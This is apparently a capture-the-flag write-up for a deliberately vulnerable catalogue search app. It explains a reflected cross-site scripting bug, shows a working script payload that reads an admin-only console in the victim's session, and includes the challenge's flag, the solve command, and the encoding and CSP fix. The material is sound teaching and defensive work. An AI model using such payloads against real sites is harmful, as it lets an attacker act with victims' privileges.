# 03 Reflector: reflected cross-site scripting

**Target:** `https://northwind-03-reflector.vercel.app`
**Bug:** a search term is written into the page without encoding it.

---

## What this application does

A public catalogue search. The search box reflects the query into the results
heading. There is also a settlement console that only an administrator can
read.

## What goes wrong

`apps/03-reflector/app/search/route.js` renders the same value two ways:

```js
// correct
<input type="search" name="q" value="${escapeHtml(query)}" ...>

// wrong
<h2>${rows.length} results for &ldquo;${query}&rdquo;</h2>
```

A browser parses the response into a document and decides what is markup and
what is text. It cannot tell which characters were meant as which, so a `<`
in the search term starts an element.

## Why a terminal is not enough

The settlement console has two checks, in `app/console/route.js`:

```js
if (claims?.sub !== 'administrator') return json({ ... }, 403);
if (request.headers.get('x-requested-with') !== 'XMLHttpRequest') {
  return json({ ... }, 403);
}
```

```bash
curl -s -H 'X-Requested-With: XMLHttpRequest' \
  https://northwind-03-reflector.vercel.app/console
# { "error": "administrator session required" }
```

There is no interactive page and the flag cannot be fetched over HTTP. It can
only be read by a browser running script in an administrator's session, which
is the capability this bug gives an attacker. Any demonstration that appeared
to work from a terminal would not be demonstrating anything.

## Reproducing it

The payload calls the console and puts the result in the page title:

```html
<script>
  fetch('/console', { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
    .then(r => r.json())
    .then(d => { document.title = d.settlement_key })
</script>
```

URL-encoded into `?q=`, then opened in a browser signed in as the
administrator:

```bash
python3 apps/solve/solve-03.py
```

```
document.title after injection: 'G24{Y0ur_Input_Becam3_M4rkup}'
```

The script runs and reads the flag. It works because the attacker does not
need anything else: no password, no session cookie of their own, and no
request to the console. They send a link, an administrator opens it, and the
script runs with that administrator's privileges.

## HttpOnly

The session cookie is marked `HttpOnly`, so `document.cookie` cannot read it in
JavaScript. It does not stop this. `HttpOnly` prevents cookie theft; it does
not stop a script acting as the user.

## The fix

```js
&ldquo;${escapeHtml(query)}&rdquo;
```

Encode at the point of output, for the context the value lands in. HTML text,
a JavaScript string, an attribute value and a URL each need different
encoding.

A Content Security Policy that forbids inline script would block this payload
as well. Encoding is the fix, the policy is a second layer.

## Other things that do not work here

- Reaching the console directly: two checks, no interactive page.
- Solving it over HTTP: not possible, for the reason above.
- `xss-proof.png`, which the script writes, is excluded from version control.
  It contains the flag in the page title.

## Checking it

```bash
BASE=https://northwind-03-reflector.vercel.app python3 apps/solve/solve-03.py
```

This one needs Playwright's Firefox, because the browser is the point.